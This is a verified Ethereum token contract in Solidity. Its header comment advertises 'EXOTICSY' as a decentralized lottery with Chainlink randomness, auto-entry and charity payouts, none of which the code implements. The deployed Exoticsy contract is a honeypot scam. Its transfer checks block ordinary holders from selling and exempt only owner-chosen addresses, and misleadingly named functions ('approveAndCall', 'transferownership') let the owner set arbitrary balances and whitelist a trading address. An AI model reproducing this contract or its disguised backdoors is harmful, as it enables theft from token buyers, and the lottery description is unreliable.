/**
 *Submitted for verification at Etherscan.io on 2022-05-23
*/

/*
Overview

EXOTICSY is the world’s first innovative decentralized lottery game for token holders.

Problems
Traditional lotteries are restrained by multiple factors that are slowing their progress down by discouraging potential participants. Since they are centralized, there is virtually no control and transparency on what the lottery provider does. There have been reports of fraudulent behavior by the provider such as unpaid winnings, manipulation of the RNG (random number generation) mechanisms, which, as a result, undermines the trust and discourages potential gamblers or betters to participate in them.
Another disadvantage that is particularly relevant to national lotteries is their outdated offline format that requires you to buy a ticket the old-fashioned way. What is more, these national lotteries offer limited prize pools since they are restricted only to the country they are conducted in.
In traditional lottery, you pay for number of tickets you want to get. E.g., Ticket price is $1, you pay $1 to get one ticket, $2 for two tickets and so on.
Solutions
EXOTICSY has the better mechanism: you only need to deposit a little token to join the round. You can get additional tickets just by holding, the more token you hold the more ticket you get, so you are beneficial by increasing the chance to win lottery round just by holding, you do not need to deposit more (spend more tokens to get more tickets). Especially, the more ticket you have, the more chance to win the grand prize.
Unlike a traditional lottery where players must continuously buy tickets for every drawing, EXOTICSY focuses on simplicity - just acquire the token, hold, and you will automatically be entered into the next lottery rounds thanks to Auto Pool feature.


Features
Fully decentralized
The entire process is managed by ONE smart contract and deployed to run on-chain.

Fully Automatic System
As you may know, smart contact itself cannot trigger states. By using with and make the smart contract is compatible with the UpKeep, the lottery game can run endlessly.

Easy to join
No need to choose lucky numbers as traditional lottery.

Incentive for token holders
Players are required to hold tokens till the end of the round to get more tickets, so it will drive the demand of token. Not only will it increase EXOTICSYE token prices, players will get more chance to win the grand prize, so this in a way is double incentive for Hodlers.

Auto Pool feature
Allow to join next rounds automatically. No action is required from users to join. Unlike a traditional lottery where players must continuously buy tickets for every drawing. Moreover, player get more tickets by joining the round soon, so that have more chance to win the round.

Provably fair and verifiable source of randomness () is used in winner selection algorithm.
"On-chain Verification of Randomness
Chainlink VRF enables smart contracts to access randomness without compromising on security or usability. With every new request for randomness, Chainlink VRF generates a random number and cryptographic proof of how that number was determined. The proof is published and verified on-chain before it can be used by any consuming applications. This process ensures that the results cannot be tampered with nor manipulated by anyone, including oracle operators, miners, users and even smart contract developers."

Chance to cooperate with other projects to expand our community
Our lottery game is developed to launch on any ERC20 token. It is a big chance for us to deploy lottery product for our partners so we can have larger community.

Be responsible with the community
We have a specific Charity wallet that receives a portion of Lottery Pool. Tokens will be converted to BNB and transfer to our charity partner.




How it works
There are unlimited rounds, each round’s period is about 3-7 days.
There are 3 states in each round: Start -> Active -> End.
Players deposit tokens to join the round while the round state is Active.
Player can join the round automatically and get the maximum tickets by using Auto Pool feature while the round state is Start.
Once the round is ended, our Upkeep in call to publicly “performUpkeep” function in the smart contract to:
-Recalculate tickets of players, reset Hold Tickets to zero if they do not hold enough token as recognized in the first deposit.
-Call to Chainlink VRF to get randomness numbers
-Find winners based on random numbers
-Reward to the prize winners


How to join a round?
Manually
Open the Active Round page, click “Join now” button, set amount, and click “Deposit”
In the 1st time, you must “Enable” by approving smart contact to spend your tokens.
In the 1st time you join a round, your amount must greater than or equal minimum joining amount. You can deposit multiple times in a round. Since the 2nd time, minimum joining amount is not required.

Automatically (Recommend)
Just deposit tokens to Auto Pool, set your joining amount. In the next rounds, your tokens will be transferred from your balance in Auto Pool to join the round automatically.
By using Auto Pool, you will get the maximum tickets as explaining in our formula


How to calculate number of player’s tickets in a round?
TICKETS = (Deposit Tickets) + (Hold Tickets)

Deposit Tickets = (Deposit Amount) x (Deposit Multiplier)
(*) Deposit Multiplier = 50

Hold Tickets = (Hold Duration) x (Hold Amount) x (Hold Multiplier)
(*) Hold Multiplier = 10
Hold Amount = balance of player in the 1st deposit (include player’s balance in the Auto Pool)
Hold Duration = (end block of the round - current block) / (end block of the round – start block of the round)

(*) Deposit Multiplier & Hold Multiplier are adjustable parameters and can be change in the next rounds if necessary.

At the end of the round - round state is End, balance of players will be scanned again. If the balance is lower than Hold Amount, then Hold Tickets will be set to zero. This is the penalty for player who wants to sell the token. It gives people an incentive to hold tokens for keeping their tickets, so they get more chance to win till the end of the round.

As you can see, you can get the maximum Hold Tickets by joining the round soon and hold as much token as possible.
Be noticed if you deposit multiple times in a round
Player can deposit to a round multiple times. However, be aware that this will reduce your Hold Amount because it is recognized in the 1st deposit.

Eg. Your balance is 100 tokens. You deposited 10 tokens to the round (first time), your Deposit Tickets is 10 x 50 = 500, your Hold Amount is recognized is: 100 - 10 = 90
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract Exoticsy {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}